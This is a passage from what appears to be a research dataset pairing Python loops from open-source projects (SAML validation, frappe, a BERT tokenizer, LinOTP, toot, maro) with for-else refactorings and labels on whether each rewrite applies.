    sc_data = scn.find('saml:SubjectConfirmationData', namespaces=OneLogin_Saml2_Constants.NSMAP)
    if sc_data is None:
        continue
    else:
        irt = sc_data.get('InResponseTo', None)
        if in_response_to is None and irt is not None and security.get('rejectUnsolicitedResponsesWithInResponseTo', False) or (in_response_to and irt and (irt != in_response_to)):
            continue
        recipient = sc_data.get('Recipient', None)
        if recipient and current_url not in recipient:
            continue
        nooa = sc_data.get('NotOnOrAfter', None)
        if nooa:
            parsed_nooa = OneLogin_Saml2_Utils.parse_SAML_to_time(nooa)
            if parsed_nooa <= OneLogin_Saml2_Utils.now():
                continue
        nb = sc_data.get('NotBefore', None)
        if nb:
            parsed_nb = OneLogin_Saml2_Utils.parse_SAML_to_time(nb)
            if parsed_nb > OneLogin_Saml2_Utils.now():
                continue
        if nooa:
            self.valid_scd_not_on_or_after = OneLogin_Saml2_Utils.parse_SAML_to_time(nooa)
        break
else:
    raise OneLogin_Saml2_ValidationError('A valid SubjectConfirmation was not found on this Response', OneLogin_Saml2_ValidationError.WRONG_SUBJECTCONFIRMATION)",1,"for scn in subject_confirmation_nodes:
    method = scn.get('Method', None)
    if method and method != OneLogin_Saml2_Constants.CM_BEARER:
        continue
    sc_data = scn.find('saml:SubjectConfirmationData', namespaces=OneLogin_Saml2_Constants.NSMAP)
    if sc_data is None:
        continue
    else:
        irt = sc_data.get('InResponseTo', None)
        if in_response_to is None and irt is not None and security.get('rejectUnsolicitedResponsesWithInResponseTo', False) or (in_response_to and irt and (irt != in_response_to)):
            continue
        recipient = sc_data.get('Recipient', None)
        if recipient and current_url not in recipient:
            continue
        nooa = sc_data.get('NotOnOrAfter', None)
        if nooa:
            parsed_nooa = OneLogin_Saml2_Utils.parse_SAML_to_time(nooa)
            if parsed_nooa <= OneLogin_Saml2_Utils.now():
                continue
        nb = sc_data.get('NotBefore', None)
        if nb:
            parsed_nb = OneLogin_Saml2_Utils.parse_SAML_to_time(nb)
            if parsed_nb > OneLogin_Saml2_Utils.now():
                continue
        if nooa:
            self.valid_scd_not_on_or_after = OneLogin_Saml2_Utils.parse_SAML_to_time(nooa)
        any_subject_confirmation = True
        break
if not any_subject_confirmation:
    raise OneLogin_Saml2_ValidationError('A valid SubjectConfirmation was not found on this Response', OneLogin_Saml2_ValidationError.WRONG_SUBJECTCONFIRMATION)","break statement is executed:None
break statement is not executed:zejun1"
frappe,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/frappe/frappe/utils/dateutils.py,https://github.com/frappe/frappe/tree/master/frappe/utils/dateutils.py,,parse_date$48,"def parse_date(date):
	""""""tries to parse given date to system's format i.e. yyyy-mm-dd. returns a string""""""
	parsed_date = None

	if "" "" in date:
		# as date-timestamp, remove the time part
		date = date.split("" "")[0]

	# why the sorting? checking should be done in a predictable order
	check_formats = [None] + sorted(
		list(dateformats), reverse=not get_user_date_format().startswith(""dd"")
	)

	for f in check_formats:
		try:
			parsed_date = user_to_str(date, f)
			if parsed_date:
				break
		except ValueError:
			pass

	if not parsed_date:
		raise Exception(
			""""""Cannot understand date - '%s'.
			Try formatting it like your default format - '%s'""""""
			% (date, get_user_date_format())
		)

	return parsed_date","for f in check_formats:
    try:
        parsed_date = user_to_str(date, f)
        if parsed_date:
            break
    except ValueError:
        pass
if not parsed_date:
    raise Exception(""Cannot understand date - '%s'.\n\t\t\tTry formatting it like your default format - '%s'"" % (date, get_user_date_format()))","for f in check_formats:
    try:
        parsed_date = user_to_str(date, f)
        if parsed_date:
            break
    except ValueError:
        pass
else:
    raise Exception(""Cannot understand date - '%s'.\n\t\t\tTry formatting it like your default format - '%s'"" % (date, get_user_date_format()))","for f in check_formats:
    try:
        parsed_date = user_to_str(date, f)
        if parsed_date:
            break
    except ValueError:
        pass
else:
    raise Exception(""Cannot understand date - '%s'.\n\t\t\tTry formatting it like your default format - '%s'"" % (date, get_user_date_format()))",1,"for f in check_formats:
    try:
        parsed_date = user_to_str(date, f)
        if parsed_date:
            break
    except ValueError:
        pass
if not parsed_date:
    raise Exception(""Cannot understand date - '%s'.\n\t\t\tTry formatting it like your default format - '%s'"" % (date, get_user_date_format()))","break statement is executed:None
break statement is not executed:zejun1"
Bert-Chinese-Text-Classification-Pytorch,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Bert-Chinese-Text-Classification-Pytorch/pytorch_pretrained/tokenization.py,https://github.com/649453932/Bert-Chinese-Text-Classification-Pytorch/tree/master/pytorch_pretrained/tokenization.py,WordpieceTokenizer,tokenize$326,"def tokenize(self, text):
        """"""Tokenizes a piece of text into its word pieces.

        This uses a greedy longest-match-first algorithm to perform tokenization
        using the given vocabulary.

        For example:
          input = ""unaffable""
          output = [""un"", ""##aff"", ""##able""]

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer`.

        Returns:
          A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
Bert-Chinese-Text-Classification-Pytorch,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Bert-Chinese-Text-Classification-Pytorch/pytorch_pretrained/tokenization.py,https://github.com/649453932/Bert-Chinese-Text-Classification-Pytorch/tree/master/pytorch_pretrained/tokenization.py,WordpieceTokenizer,tokenize$326,"def tokenize(self, text):
        """"""Tokenizes a piece of text into its word pieces.

        This uses a greedy longest-match-first algorithm to perform tokenization
        using the given vocabulary.

        For example:
          input = ""unaffable""
          output = [""un"", ""##aff"", ""##able""]

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer`.

        Returns:
          A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
LightNet,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/LightNet/datasets/cityscapesscripts/evaluation/evalInstanceLevelSemanticLabeling.py,https://github.com/linksense/LightNet/tree/master/datasets/cityscapesscripts/evaluation/evalInstanceLevelSemanticLabeling.py,,evaluateMatches$352,"def evaluateMatches(matches, args):
    # In the end, we need two vectors for each class and for each overlap
    # The first vector (y_true) is binary and is 1, where the ground truth says true,
    # and is 0 otherwise.
    # The second vector (y_score) is float [0...1] and represents the confidence of
    # the prediction.
    #
    # We represent the following cases as:
    #                                       | y_true |   y_score
    #   gt instance with matched prediction |    1   | confidence
    #   gt instance w/o  matched prediction |    1   |     0.0
    #          false positive prediction    |    0   | confidence
    #
    # The current implementation makes only sense for an overlap threshold >= 0.5,
    # since only then, a single prediction can either be ignored or matched, but
    # never both. Further, it can never match to two gt instances.
    # For matching, we vary the overlap and do the following steps:
    #   1.) remove all predictions that satisfy the overlap criterion with an ignore region (either void or *group)
    #   2.) remove matches that do not satisfy the overlap
    #   3.) mark non-matched predictions as false positive

    # AP
    overlaps  = args.overlaps
    # region size
    minRegionSizes = args.minRegionSizes
    # distance thresholds
    distThs   = args.distanceThs
    # distance confidences
    distConfs = args.distanceConfs
    # only keep the first, if distances are not available
    if not args.distanceAvailable:
        minRegionSizes = [ minRegionSizes[0] ]
        distThs        = [ distThs       [0] ]
        distConfs      = [ distConfs     [0] ]

    # last three must be of same size
    if len(distThs) != len(minRegionSizes):
        printError(""Number of distance thresholds and region sizes different"")
    if len(distThs) != len(distConfs):
        printError(""Number of distance thresholds and confidences different"")

    # Here we hold the results
    # First dimension is class, second overlap
    ap = np.zeros( (len(distThs) , len(args.instLabels) , len(overlaps)) , np.float )

    for dI,(minRegionSize,distanceTh,distanceConf) in enumerate(zip(minRegionSizes,distThs,distConfs)):
        for (oI,overlapTh) in enumerate(overlaps):
            for (lI,labelName) in enumerate(args.instLabels):
                y_true   = np.empty( 0 )
                y_score  = np.empty( 0 )
                # count hard false negatives
                hardFns  = 0
                # found at least one gt and predicted instance?
                haveGt   = False
                havePred = False

                for img in matches:
                    predInstances = matches[img][""prediction"" ][labelName]
                    gtInstances   = matches[img][""groundTruth""][labelName]
                    # filter groups in ground truth
                    gtInstances   = [ gt for gt in gtInstances if gt[""instID""]>=1000 and gt[""pixelCount""]>=minRegionSize and gt[""medDist""]<=distanceTh and gt[""distConf""]>=distanceConf ]

                    if gtInstances:
                        haveGt = True
                    if predInstances:
                        havePred = True

                    curTrue  = np.ones ( len(gtInstances) )
                    curScore = np.ones ( len(gtInstances) ) * (-float(""inf""))
                    curMatch = np.zeros( len(gtInstances) , dtype=np.bool )

                    # collect matches
                    for (gtI,gt) in enumerate(gtInstances):
                        foundMatch = False
                        for pred in gt[""matchedPred""]:
                            overlap = float(pred[""intersection""]) / (gt[""pixelCount""]+pred[""pixelCount""]-pred[""intersection""])
                            if overlap > overlapTh:
                                # the score
                                confidence = pred[""confidence""]

                                # if we already hat a prediction for this groundtruth
                                # the prediction with the lower score is automatically a false positive
                                if curMatch[gtI]:
                                    maxScore = max( curScore[gtI] , confidence )
                                    minScore = min( curScore[gtI] , confidence )
                                    curScore[gtI] = maxScore
                                    # append false positive
                                    curTrue  = np.append(curTrue,0)
                                    curScore = np.append(curScore,minScore)
                                    curMatch = np.append(curMatch,True)
                                # otherwise set score
                                else:
                                    foundMatch = True
                                    curMatch[gtI] = True
                                    curScore[gtI] = confidence

                        if not foundMatch:
                            hardFns += 1

                    # remove non-matched ground truth instances
                    curTrue  = curTrue [ curMatch==True ]
                    curScore = curScore[ curMatch==True ]

                    # collect non-matched predictions as false positive
                    for pred in predInstances:
                        foundGt = False
                        for gt in pred[""matchedGt""]:
                            overlap = float(gt[""intersection""]) / (gt[""pixelCount""]+pred[""pixelCount""]-gt[""intersection""])
                            if overlap > overlapTh:
                                foundGt = True
                                break
                        if not foundGt:
                            # collect number of void and *group pixels
                            nbIgnorePixels = pred[""voidIntersection""]
                            for gt in pred[""matchedGt""]:
                                # group?
                                if gt[""instID""] < 1000:
                                    nbIgnorePixels += gt[""intersection""]
                                # small ground truth instances
                                if gt[""pixelCount""] < minRegionSize or gt[""medDist""]>distanceTh or gt[""distConf""]<distanceConf:
                                    nbIgnorePixels += gt[""intersection""]
                            proportionIgnore = float(nbIgnorePixels)/pred[""pixelCount""]
                            # if not ignored
                            # append false positive
                            if proportionIgnore <= overlapTh:
                                curTrue = np.append(curTrue,0)
                                confidence = pred[""confidence""]
                                curScore = np.append(curScore,confidence)

                    # append to overall results
                    y_true  = np.append(y_true,curTrue)
                    y_score = np.append(y_score,curScore)

                # compute the average precision
                if haveGt and havePred:
                    # compute precision recall curve first

                    # sorting and cumsum
                    scoreArgSort      = np.argsort(y_score)
                    yScoreSorted      = y_score[scoreArgSort]
                    yTrueSorted       = y_true[scoreArgSort]
                    yTrueSortedCumsum = np.cumsum(yTrueSorted)

                    # unique thresholds
                    (thresholds,uniqueIndices) = np.unique( yScoreSorted , return_index=True )

                    # since we need to add an artificial point to the precision-recall curve
                    # increase its length by 1
                    nbPrecRecall = len(uniqueIndices) + 1

                    # prepare precision recall
                    nbExamples     = len(yScoreSorted)
                    nbTrueExamples = yTrueSortedCumsum[-1]
                    precision      = np.zeros(nbPrecRecall)
                    recall         = np.zeros(nbPrecRecall)

                    # deal with the first point
                    # only thing we need to do, is to append a zero to the cumsum at the end.
                    # an index of -1 uses that zero then
                    yTrueSortedCumsum = np.append( yTrueSortedCumsum , 0 )

                    # deal with remaining
                    for idxRes,idxScores in enumerate(uniqueIndices):
                        cumSum = yTrueSortedCumsum[idxScores-1]
                        tp = nbTrueExamples - cumSum
                        fp = nbExamples     - idxScores - tp
                        fn = cumSum + hardFns
                        p  = float(tp)/(tp+fp)
                        r  = float(tp)/(tp+fn)
                        precision[idxRes] = p
                        recall   [idxRes] = r

                    # first point in curve is artificial
                    precision[-1] = 1.
                    recall   [-1] = 0.

                    # compute average of precision-recall curve
                    # integration is performed via zero order, or equivalently step-wise integration
                    # first compute the widths of each step:
                    # use a convolution with appropriate kernel, manually deal with the boundaries first
                    recallForConv = np.copy(recall)
                    recallForConv = np.append( recallForConv[0] , recallForConv )
                    recallForConv = np.append( recallForConv    , 0.            )

                    stepWidths = np.convolve(recallForConv,[-0.5,0,0.5],'valid')

                    # integrate is now simply a dot product
                    apCurrent = np.dot( precision , stepWidths )

                elif haveGt:
                    apCurrent = 0.0
                else:
                    apCurrent = float('nan')
                ap[dI,lI,oI] = apCurrent

    return ap","for gt in pred['matchedGt']:
    overlap = float(gt['intersection']) / (gt['pixelCount'] + pred['pixelCount'] - gt['intersection'])
    if overlap > overlapTh:
        foundGt = True
        break
if not foundGt:
    nbIgnorePixels = pred['voidIntersection']
    for gt in pred['matchedGt']:
        if gt['instID'] < 1000:
            nbIgnorePixels += gt['intersection']
        if gt['pixelCount'] < minRegionSize or gt['medDist'] > distanceTh or gt['distConf'] < distanceConf:
            nbIgnorePixels += gt['intersection']
    proportionIgnore = float(nbIgnorePixels) / pred['pixelCount']
    if proportionIgnore <= overlapTh:
        curTrue = np.append(curTrue, 0)
        confidence = pred['confidence']
        curScore = np.append(curScore, confidence)","for gt in pred['matchedGt']:
    overlap = float(gt['intersection']) / (gt['pixelCount'] + pred['pixelCount'] - gt['intersection'])
    if overlap > overlapTh:
        break
else:
    nbIgnorePixels = pred['voidIntersection']
    for gt in pred['matchedGt']:
        if gt['instID'] < 1000:
            nbIgnorePixels += gt['intersection']
        if gt['pixelCount'] < minRegionSize or gt['medDist'] > distanceTh or gt['distConf'] < distanceConf:
            nbIgnorePixels += gt['intersection']
    proportionIgnore = float(nbIgnorePixels) / pred['pixelCount']
    if proportionIgnore <= overlapTh:
        curTrue = np.append(curTrue, 0)
        confidence = pred['confidence']
        curScore = np.append(curScore, confidence)","for gt in pred['matchedGt']:
    overlap = float(gt['intersection']) / (gt['pixelCount'] + pred['pixelCount'] - gt['intersection'])
    if overlap > overlapTh:
        break
else:
    nbIgnorePixels = pred['voidIntersection']
    for gt in pred['matchedGt']:
        if gt['instID'] < 1000:
            nbIgnorePixels += gt['intersection']
        if gt['pixelCount'] < minRegionSize or gt['medDist'] > distanceTh or gt['distConf'] < distanceConf:
            nbIgnorePixels += gt['intersection']
    proportionIgnore = float(nbIgnorePixels) / pred['pixelCount']
    if proportionIgnore <= overlapTh:
        curTrue = np.append(curTrue, 0)
        confidence = pred['confidence']
        curScore = np.append(curScore, confidence)",1,"for gt in pred['matchedGt']:
    overlap = float(gt['intersection']) / (gt['pixelCount'] + pred['pixelCount'] - gt['intersection'])
    if overlap > overlapTh:
        foundGt = True
        break
if not foundGt:
    nbIgnorePixels = pred['voidIntersection']
    for gt in pred['matchedGt']:
        if gt['instID'] < 1000:
            nbIgnorePixels += gt['intersection']
        if gt['pixelCount'] < minRegionSize or gt['medDist'] > distanceTh or gt['distConf'] < distanceConf:
            nbIgnorePixels += gt['intersection']
    proportionIgnore = float(nbIgnorePixels) / pred['pixelCount']
    if proportionIgnore <= overlapTh:
        curTrue = np.append(curTrue, 0)
        confidence = pred['confidence']
        curScore = np.append(curScore, confidence)","break statement is executed:None
break statement is not executed:zejun1"
LinOTP,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/LinOTP/linotp/tokens/ocra2token/ocra2token.py,https://github.com/LinOTP/LinOTP/tree/master/linotp/tokens/ocra2token/ocra2token.py,Ocra2TokenClass,checkOtp$1218,"def checkOtp(self, passw, counter, window, options=None):
        """"""
        checkOtp - standard callback of linotp to verify the token

        :param passw:      the passw / otp, which has to be checked
        :type passw:       string
        :param counter:    the start counter
        :type counter:     int
        :param  window:    the window, in which the token is valid
        :type  window:     int
        :param options:    options contains the transaction id,
                            eg. if check_t checks one transaction
                            this will support assynchreonous otp checks
                            (when check_t is used)
        :type options:     dict

        :return:           verification counter or -1
        :rtype:            int (-1)

        """"""
        ret = -1

        challenges = []
        serial = self.getSerial()

        if options is None:
            options = {}

        maxRequests = int(getFromConfig(""Ocra2MaxChallengeRequests"", ""3""))

        if ""transactionid"" in options:
            transid = options.get(""transactionid"", None)
            challs = Challenges.lookup_challenges(
                serial=serial, transid=transid
            )
            for chall in challs:
                if chall.is_open():
                    (rec_tan, rec_valid) = chall.getTanStatus()
                    if rec_tan is False:
                        challenges.append(chall)
                    elif rec_valid is False:
                        # # add all touched but failed challenges
                        if chall.getTanCount() <= maxRequests:
                            challenges.append(chall)

        if ""challenge"" in options:
            # direct challenge - there might be addtionalget info like
            # session data in the options
            challenges.append(options)

        if len(challenges) == 0:
            challs = Challenges.lookup_challenges(serial=serial)
            for chall in challs:
                if chall.is_open():
                    (rec_tan, rec_valid) = chall.getTanStatus()
                    if rec_tan is False:
                        # # add all untouched challenges
                        challenges.append(chall)
                    elif rec_valid is False:
                        # add all touched but failed challenges
                        if chall.getTanCount() <= maxRequests:
                            challenges.append(chall)

        if len(challenges) == 0:
            err = ""No open transaction found for token %s"" % serial
            log.info(err)  # TODO should log and fail!!
            return -1

        # prepare the challenge check - do the ocra setup
        secObj = self._get_secret_object()
        ocraSuite = OcraSuite(self.getOcraSuiteSuite(), secObj)

        # set the ocra token pin
        ocraPin = """"
        if ocraSuite.P is not None:
            key, iv = self.token.getUserPin()
            ocraPin = SecretObj.decrypt(key, iv, hsm=context.get(""hsm""))

            if ocraPin is None or len(ocraPin) == 0:
                ocraPin = """"

        timeShift = 0
        if ocraSuite.T is not None:
            defTimeWindow = int(getFromConfig(""ocra.timeWindow"", 180))
            window = (
                int(self.getFromTokenInfo(""timeWindow"", defTimeWindow))
                // ocraSuite.T
            )
            defTimeShift = int(getFromConfig(""ocra.timeShift"", 0))
            timeShift = int(self.getFromTokenInfo(""timeShift"", defTimeShift))

        default_retry_window = int(
            getFromConfig(""ocra2.max_check_challenge_retry"", 0)
        )
        retry_window = int(
            self.getFromTokenInfo(
                ""max_check_challenge_retry"", default_retry_window
            )
        )

        # now check the otp for each challenge

        for ch in challenges:
            challenge = {}

            # preserve transaction context, so we could use this in the status
            # callback
            self.transId = ch.get(""transid"", None)
            challenge[""transid""] = self.transId
            challenge[""session""] = ch.get(""session"", None)

            # we saved the 'real' challenge in the data
            data = ch.get(""data"", None)
            if data is not None:
                challenge[""challenge""] = data.get(""challenge"")
            elif ""challenge"" in ch:
                # handle explicit challenge requests
                challenge[""challenge""] = ch.get(""challenge"")

            if challenge.get(""challenge"") is None:
                raise Exception(
                    ""could not checkOtp due to missing challenge""
                    "" in request: %r"" % ch
                )

            ret = ocraSuite.checkOtp(
                passw,
                counter,
                window,
                challenge,
                pin=ocraPin,
                options=options,
                timeshift=timeShift,
            )

            # due to the assynchronous challenge verification of the checkOtp
            # it might happen, that the found counter is lower than the given
            # one. Thus we fix this here to deny assynchronous verification

            # we do not support retry checks anymore:
            # which means, that ret might be smaller than the actual counter
            if ocraSuite.T is None:
                if ret + retry_window < counter:
                    ret = -1

            if ret != -1:
                break

        if -1 == ret:
            # autosync: test if two consecutive challenges + it's counter match
            ret = self.autosync(ocraSuite, passw, challenge)

        return ret","for ch in challenges:
    challenge = {}
    self.transId = ch.get('transid', None)
    challenge['transid'] = self.transId
    challenge['session'] = ch.get('session', None)
    data = ch.get('data', None)
    if data is not None:
        challenge['challenge'] = data.get('challenge')
    elif 'challenge' in ch:
        challenge['challenge'] = ch.get('challenge')
    if challenge.get('challenge') is None:
        raise Exception('could not checkOtp due to missing challenge in request: %r' % ch)
    ret = ocraSuite.checkOtp(passw, counter, window, challenge, pin=ocraPin, options=options, timeshift=timeShift)
    if ocraSuite.T is None:
        if ret + retry_window < counter:
            ret = -1
    if ret != -1:
        break
if -1 == ret:
    ret = self.autosync(ocraSuite, passw, challenge)","for ch in challenges:
    challenge = {}
    self.transId = ch.get('transid', None)
    challenge['transid'] = self.transId
    challenge['session'] = ch.get('session', None)
    data = ch.get('data', None)
    if data is not None:
        challenge['challenge'] = data.get('challenge')
    elif 'challenge' in ch:
        challenge['challenge'] = ch.get('challenge')
    if challenge.get('challenge') is None:
        raise Exception('could not checkOtp due to missing challenge in request: %r' % ch)
    ret = ocraSuite.checkOtp(passw, counter, window, challenge, pin=ocraPin, options=options, timeshift=timeShift)
    if ocraSuite.T is None:
        if ret + retry_window < counter:
            ret = -1
    if ret != -1:
        break
else:
    ret = self.autosync(ocraSuite, passw, challenge)","for ch in challenges:
    challenge = {}
    self.transId = ch.get('transid', None)
    challenge['transid'] = self.transId
    challenge['session'] = ch.get('session', None)
    data = ch.get('data', None)
    if data is not None:
        challenge['challenge'] = data.get('challenge')
    elif 'challenge' in ch:
        challenge['challenge'] = ch.get('challenge')
    if challenge.get('challenge') is None:
        raise Exception('could not checkOtp due to missing challenge in request: %r' % ch)
    ret = ocraSuite.checkOtp(passw, counter, window, challenge, pin=ocraPin, options=options, timeshift=timeShift)
    if ocraSuite.T is None:
        if ret + retry_window < counter:
            ret = -1
    if ret != -1:
        break
else:
    ret = self.autosync(ocraSuite, passw, challenge)",1,"for ch in challenges:
    challenge = {}
    self.transId = ch.get('transid', None)
    challenge['transid'] = self.transId
    challenge['session'] = ch.get('session', None)
    data = ch.get('data', None)
    if data is not None:
        challenge['challenge'] = data.get('challenge')
    elif 'challenge' in ch:
        challenge['challenge'] = ch.get('challenge')
    if challenge.get('challenge') is None:
        raise Exception('could not checkOtp due to missing challenge in request: %r' % ch)
    ret = ocraSuite.checkOtp(passw, counter, window, challenge, pin=ocraPin, options=options, timeshift=timeShift)
    if ocraSuite.T is None:
        if ret + retry_window < counter:
            ret = -1
    if ret != -1:
        break
if -1 == ret:
    ret = self.autosync(ocraSuite, passw, challenge)","break statement is executed:None
break statement is not executed:zejun1"
toot,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/toot/toot/tui/utils.py,https://github.com/ihabunek/toot/tree/master/toot/tui/utils.py,,show_media$55,"def show_media(paths):
    """"""
    Attempt to open an image viewer to show given media files.

    FIXME: This is not very thought out, but works for me.
    Once settings are implemented, add an option for the user to configure their
    prefered media viewer.
    """"""
    viewer = None
    potential_viewers = [
        ""feh"",
        ""eog"",
        ""display""
    ]
    for v in potential_viewers:
        viewer = shutil.which(v)
        if viewer:
            break

    if not viewer:
        raise Exception(""Cannot find an image viewer"")

    subprocess.run([viewer] + paths)","for v in potential_viewers:
    viewer = shutil.which(v)
    if viewer:
        break
if not viewer:
    raise Exception('Cannot find an image viewer')","for v in potential_viewers:
    viewer = shutil.which(v)
    if viewer:
        break
else:
    raise Exception('Cannot find an image viewer')","for v in potential_viewers:
    viewer = shutil.which(v)
    if viewer:
        break
else:
    raise Exception('Cannot find an image viewer')",1,"for v in potential_viewers:
    viewer = shutil.which(v)
    if viewer:
        break
if not viewer:
    raise Exception('Cannot find an image viewer')","break statement is executed:None
break statement is not executed:zejun1"
maro,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/maro/maro/cli/grass/lib/services/master_agent/agent.py,https://github.com/microsoft/maro/tree/master/maro/cli/grass/lib/services/master_agent/agent.py,ResourceController,_get_single_metric_compacted_allocation_plan$829,"def _get_single_metric_compacted_allocation_plan(
        allocation_details: dict,
        required_resources: list,
        free_resources: list,
    ) -> dict:
        """"""Get single_metric_compacted allocation plan.

        The strategy uses a specific metric as the priority,
        then use a greedy approach to match the container to the available node
        with the smallest remaining free resource.

        Args:
            allocation_details (dict): Details of allocation config.
            required_resources (list): List of ContainerResource.
            free_resources (list): List of NodeResource.

        Returns:
            dict[str, str]: container_name to node_name mapping.
        """"""
        # Init params.
        allocation_plan = {}
        if ""metric"" not in allocation_details or allocation_details[""metric""].lower() not in AVAILABLE_METRICS:
            raise ResourceAllocationFailed(""Invalid allocation parameter: metric"")
        metric = allocation_details[""metric""].lower()

        # Init resources PQ.
        required_resources_pq = []
        for required_resource in required_resources:
            heapq.heappush(
                required_resources_pq,
                (-getattr(required_resource, metric), required_resource),
            )
        free_resources_pq = []
        for free_resource in free_resources:
            heapq.heappush(
                free_resources_pq,
                (getattr(free_resource, metric), free_resource),
            )

        # Get allocation.
        while len(required_resources_pq) > 0:
            is_allocated = False

            # Get vars.
            required_resource = heapq.heappop(required_resources_pq)[1]
            free_resource = None

            not_usable_free_resources = []
            while len(free_resources_pq) > 0:
                free_resource = heapq.heappop(free_resources_pq)[1]
                if free_resource >= required_resource:
                    is_allocated = True
                    break
                else:
                    not_usable_free_resources.append(free_resource)

            # Do allocation or return error.
            if is_allocated:
                allocation_plan[required_resource.container_name] = free_resource.node_name
                free_resource.cpu -= required_resource.cpu
                free_resource.memory -= required_resource.memory
                free_resource.gpu -= required_resource.gpu
                heapq.heappush(
                    free_resources_pq,
                    (getattr(free_resource, metric), free_resource),
                )
                for not_usable_free_resource in not_usable_free_resources:
                    heapq.heappush(
                        free_resources_pq,
                        (getattr(not_usable_free_resource, metric), not_usable_free_resource),
                    )
            else:
                # add previous resources back, to do printing.
                for not_usable_free_resource in not_usable_free_resources:
                    heapq.heappush(
                        free_resources_pq,
                        (getattr(not_usable_free_resource, metric), not_usable_free_resource),
                    )
                heapq.heappush(
                    required_resources_pq,
                    (-getattr(required_resource, metric), required_resource),
                )

                logger.warning(allocation_plan)
                logger.warning(required_resources_pq)
                logger.warning(free_resources_pq)
                raise ResourceAllocationFailed(""Unable to allocate, Abort"")

        logger.info(required_resources)
        logger.info(free_resources)
        return allocation_plan","while len(free_resources_pq) > 0:
    free_resource = heapq.heappop(free_resources_pq)[1]
    if free_resource >= required_resource:
        is_allocated = True
        break
    else:
        not_usable_free_resources.append(free_resource)
if is_allocated:
    allocation_plan[required_resource.container_name] = free_resource.node_name
    free_resource.cpu -= required_resource.cpu
    free_resource.memory -= required_resource.memory
    free_resource.gpu -= required_resource.gpu
    heapq.heappush(free_resources_pq, (getattr(free_resource, metric), free_resource))
    for not_usable_free_resource in not_usable_free_resources:
        heapq.heappush(free_resources_pq, (getattr(not_usable_free_resource, metric), not_usable_free_resource))
else:
    for not_usable_free_resource in not_usable_free_resources:
        heapq.heappush(free_resources_pq, (getattr(not_usable_free_resource, metric), not_usable_free_resource))
    heapq.heappush(required_resources_pq, (-getattr(required_resource, metric), required_resource))
    logger.warning(allocation_plan)
    logger.warning(required_resources_pq)
    logger.warning(free_resources_pq)
    raise ResourceAllocationFailed('Unable to allocate, Abort')","while len(free_resources_pq) > 0:
    free_resource = heapq.heappop(free_resources_pq)[1]
    if free_resource >= required_resource:
        allocation_plan[required_resource.container_name] = free_resource.node_name
        free_resource.cpu -= required_resource.cpu
        free_resource.memory -= required_resource.memory
        free_resource.gpu -= required_resource.gpu
        heapq.heappush(free_resources_pq, (getattr(free_resource, metric), free_resource))
        for not_usable_free_resource in not_usable_free_resources:
            heapq.heappush(free_resources_pq, (getattr(not_usable_free_resource, metric), not_usable_free_resource))
        break
